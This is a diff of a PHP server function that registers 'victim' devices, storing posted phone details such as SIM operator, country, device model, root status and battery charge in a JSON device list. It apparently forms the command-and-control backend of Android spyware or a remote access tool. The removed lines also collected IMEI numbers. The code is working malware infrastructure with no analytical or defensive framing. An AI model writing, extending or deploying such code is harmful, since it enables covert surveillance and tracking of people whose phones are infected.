@@ -30,29 +30,27 @@ function add_new_device(){
     }
 
     $post_data = [
-        'INFO' => $_POST['new_device'],
         'UNIQUE_ID' => $_POST['unique_id'],
-        'IMEI' => $_POST['imei'],
-        'OS_VERSION' => $_POST['os_version'],
-        'PHONE_PRODUCT' => $_POST['phone_product'],
-        'PHONE_MODEL' => $_POST['phone_model'],
+        'COUNTRY' => $_POST['country'],
+        'SOFTWARE_VERSION' => $_POST['software_version'],
+        'SIM_OPERATOR' => $_POST['sim_operator'],
+        'DEVICE_MODEL' => $_POST['device_model'],
         'DEVICE_LANGUAGE' => $_POST['device_language'],
         'IS_ROOTED' => $_POST['is_rooted'],
         'CHARGE' => $_POST['charge'],
-        'TOTAL_RAM' => $_POST['total_ram'],
-        'LOCALE_INFO' => $_POST['locale_info']
+        'TOTAL_RAM' => $_POST['total_ram']
     ];
 
     $strJsonFileContents = file_get_contents($device_path);
     $victim_array = json_decode($strJsonFileContents, true);
     $victim_array['device_list'][ $_POST['unique_id']] = $post_data;
-    file_put_contents($device_path, json_encode($victim_array, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+    file_put_contents($device_path, createJson($victim_array));
     $response_data['status'] = true;
     echo createJson($response_data);
     
 }
 
-if (isset($_POST['new_device'])){
+if (isset($_POST['add_victim_device'])){
     add_new_device();
 }
 
